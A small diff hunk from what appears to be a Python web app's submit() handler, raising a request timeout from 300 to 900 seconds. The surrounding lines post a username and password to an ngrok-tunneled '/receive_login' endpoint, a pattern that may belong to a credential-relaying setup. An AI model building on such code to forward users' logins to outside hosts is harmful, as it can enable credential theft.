@@ -37,7 +37,7 @@ def submit():
             f"{NGROK_BACKEND_URL}/receive_login",
             data={'username': username, 'password': password},
             files=files,
-            timeout=300
+            timeout=900
         )
 
         if response.status_code != 200:
